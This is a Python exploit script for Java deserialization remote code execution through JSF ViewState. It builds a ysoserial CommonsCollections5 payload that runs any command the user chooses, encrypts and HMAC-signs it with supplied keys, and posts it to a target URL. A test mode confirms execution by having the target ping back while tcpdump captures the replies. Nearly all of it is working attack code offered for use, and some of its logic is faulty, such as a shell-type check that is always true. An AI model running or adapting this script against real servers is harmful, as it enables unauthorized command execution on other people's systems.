#!/usr/bin/env python

import hashlib
import hmac
import base64
import requests
import argparse
import os
import binascii
import subprocess
import socket
import fcntl
import struct
import netifaces
import sys

Bold='\033[1m'
Red='\033[0;31m'
Green='\033[0;32m'
Blue='\033[0;94m'
NC='\033[0m' # No Color

def print_banner():
    print(Green + Bold)
    print("     ______  _____  _____              ___                       ")
    print("     | ___ \/  __ \|  ___|            |_  |                      ")
    print("     | |_/ /| /  \/| |__    ______      | | __ ___   ____ _      ")
    print("     |    / | |    |  __|  |______|     | |/ _` \ \ / / _` |     ")
    print("     | |\ \ | \__/\| |___           /\__/ / (_| |\ V / (_| |     ")
    print("     \_| \_| \____/\____/           \____/ \__,_| \_/ \__,_|     ")
    print("                                                                 ")
    print("______                    _       _ _          _   _             ")
    print("|  _  \                  (_)     | (_)        | | (_)            ")
    print("| | | |___  ___  ___ _ __ _  __ _| |_ ______ _| |_ _  ___  _ __  ")
    print("| | | / _ \/ __|/ _ \ '__| |/ _` | | |_  / _` | __| |/ _ \| '_ \ ")
    print("| |/ /  __/\__ \  __/ |  | | (_| | | |/ / (_| | |_| | (_) | | | |")
    print("|___/ \___||___/\___|_|  |_|\__,_|_|_/___\__,_|\__|_|\___/|_| |_|")
    print("")
    print("Created by: X4v1l0k and Rival23.")
    print(NC + "")


def get_arguments(testmode):
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--targetURL", dest="targetURL", help="Vulnerable URL.")
    parser.add_argument("-t", "--shellType", dest="ShellType", help="Shell type of command to execute (cmd/powershell/bash/none).")
    parser.add_argument("-c", "--command", dest="command", help="Command to execute.")
    parser.add_argument("-k", "--secretkey", dest="secretKey", help="Secret key for encryption in OpenSSL.")
    parser.add_argument("-m", "--hmacKey", dest="hmacKey", help="HMAC key for encoding the HMAC payload.")
    parser.add_argument("-p", "--payload-type", dest="payloadType", help="Choose your type of payload.")
    parser.add_argument("-x", "--testrce", dest="testRCE", action='store_true', help="Use this to test RCE.")
    options = parser.parse_args()
    if not options.targetURL:
        parser.error("[-] Please specify an URL address, use -h or --help for more info.")
    if options.targetURL[0:4] != "http":
        options.targetURL = "http://" + options.targetURL
    if not options.ShellType:
        parser.error("[-] Please specify the shell type of command to execute, use -h or --help for more info.")
    if not options.command:
        if not options.testRCE:
            parser.error("[-] Please specify a command to execute, use -h or --help for more info.")
        else:
            command = ""
    if not options.secretKey:
        parser.error("[-] Please specify the secret key used in the OpenSSL encoder, something like (4a7346393837362d).")
    if not options.hmacKey:
        parser.error("[-] Please specify the secret key used in the HMAC encoder.")
    if not options.payloadType:
        parser.error("[-] Please specify a type of payload (CommonsCollections5)")
    if options.testRCE:
        testmode = True
        testRCE(options, testmode)
        #sys.exit("Test Completed.")
    return options


Our_Interface = None


def getIP(options):
    #get interface and IP
    Our_IP = None
    global Our_Interface
    Target = options.targetURL.split("//")[1]
    ipaddr_Target = Target.split(".")[0] + "." + Target.split(".")[1]
    Array_Interfaces = netifaces.interfaces()

    for interface in Array_Interfaces:
        try:
            ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
            ipaddr = ip.split(".")[0] + "." + ip.split(".")[1]
            if ipaddr_Target == ipaddr:
                Our_IP = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
                Our_Interface = interface
        except:
           # ip = "No IP"
            if Our_IP == None:
                Our_IP = requests.get('https://api.ipify.org').text
    return Our_IP


def generate_error(message):
    error_message = Red + Bold + "[-] " + NC + message
    sys.exit(error_message)


def showOptions(options, testmode):
    # ---- Print Options ----
    print(Blue + Bold + "- URL: " + NC + options.targetURL)
    print(Blue + Bold + "- Shell type: " + NC + options.ShellType)
    if not testmode:
        print(Blue + Bold + "- Command: " + NC + options.command)
    print(Blue + Bold + "- OpenSSL key: " + NC + options.secretKey)
    print(Blue + Bold + "- HMAC key: " + NC + options.hmacKey)
    print(Blue + Bold + "- Payload type: " + NC + options.payloadType)
    # print(Blue + Bold + "- MMAC algorithm: " + NC + hashdef)


def test_java():
    # if java is present in current directory -> return true
    try:
        with open('ysoserial-modified.jar'):
            return True
    # if java is not present return false to execute error
    except:
        print("Ysoserial-modified is not present.")
        while True:
            qr = input('Do you download it?')
            if qr == '' or not qr[0].lower() in ['y', 'n']:
                print('Please answer with yes or no!')
            else:
                break
        if qr[0].lower() == 'y':
            os.system("wget https://github.com/pimps/ysoserial-modified/blob/master/target/ysoserial-modified.jar?raw=true")
        if qr[0].lower() == 'n':
            error_message = "Sorry, can not run the exploit without Ysoserial-modified"
            generate_error(error_message)


def create_payload(options, testmode):
    # re check the payload maybe generate it from kali (ysoserial pipe to base64)
    # and make sure it is java 8 in order for it to work.
    # url = 'http://10.10.10.130:8080/userSubscribe.faces'
    typecommand = options.ShellType
    command = options.command
    targeturl = options.targetURL
    key = options.secretKey
    payloadType = options.payloadType
    HMAC_Key = options.hmacKey
    showOptions(options, testmode)
    if testmode:
        print("")
        print(Green + Bold + " [+] " + NC + "Checking response.")
    url = targeturl
    if test_java():
        print("")
        print(Green + Bold + " [+] "  + NC + "Creating payload with ysoserial.")
        os.popen('java -jar ysoserial-modified.jar ' + payloadType + ' ' + typecommand + ' \'' + command + '\' > command.bin')
        os.popen('openssl enc -des-ecb -K ' + key + ' -in command.bin -out command.bin.enc')

        __module_id__ = "$Id$"

        # encode payload using HMAC algorithm
        with open('command.bin.enc', 'rb') as f:
            payload_to_encode = f.read()

        hash = hmac.new(HMAC_Key, payload_to_encode, hashlib.sha1)
        digest = hash.digest()
        hmac_payload = base64.encodestring(digest)

        with open("command.bin.enc", "a") as myfile:
            myfile.write(base64.b64decode(hmac_payload))

        os.popen('openssl enc -base64 -in command.bin.enc -out command.bin.enc.b64')

        with open('command.bin.enc.b64', 'rb') as f:
            my_sig = f.read()

        data = {"j_id_jsp_1623871077_1": "email=test@gmail.com", "j_id_jsp_1623871077_1": "submit=SIGN+UP",
                "j_id_jsp_1623871077_1_SUBMIT": "1", "javax.faces.ViewState": my_sig}

        print("")
        print(Green + Bold + " [+] " + NC + "Payload created.")

        print("")
        print(Green + Bold + " [+] " + NC + "Sending request.")

        with requests.Session() as s:
            try:
                resp_get = s.get(url)
                try:
                    resp_post = s.post(url, data=data)
                except:
                    # error for wrong data
                    errormessage = "Something wrong with the data, check script to adapt and try again"
                    return generate_error(errormessage)
            except:
                # error for wrong url
                errormessage = "Please check your URL and try again"
                return generate_error(errormessage)

        print("")
        print(Green + Bold + " [+] "  + NC + "Request sent.")
        print("")

        os.remove("command.bin")
        os.remove("command.bin.enc")
        os.remove("command.bin.enc.b64")
    else:
        generate_error("ysoserial needs to be in the same directory")


def testRCE(options, testmode):
    # print(Green + Bold + " [+] " + NC + "Checking response.")
    Our_IP = getIP(options)

    if options.ShellType == "cmd" or "powershell":
        options.command = 'Ping -n 3 ' + Our_IP
    else:
        options.command = 'Ping -c 3 ' + Our_IP
    create_payload(options, testmode)
    try:
        Ping_Response = subprocess.Popen("timeout 10 tcpdump -i " + Our_Interface + " -c 3 icmp 2>/dev/null", stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    except:
        error_message = "Something went wrong with capturing the packets on interface " + Our_Interface
        generate_error(error_message)
    for row in iter(Ping_Response.stdout.readline, b''):
        Response.extend([row.rstrip()])

    if int(len(Response)) > 1:
        print(Green + Bold + " [+] " + NC + "Response received.")
        print("")
        print(Green + Bold + " [+] " + NC + "Enjoy your exploiting!")
        print("")
        sys.exit()
    else:
        print(Red + Bold + " [-] " + NC + "Response not received.")
        print("")
        print(Red + Bold + " [-] " + NC + "Check your params!")
        print("")
        sys.exit()


test_mode = False
Response = []
print_banner()
options = get_arguments(test_mode)
create_payload(options, test_mode)
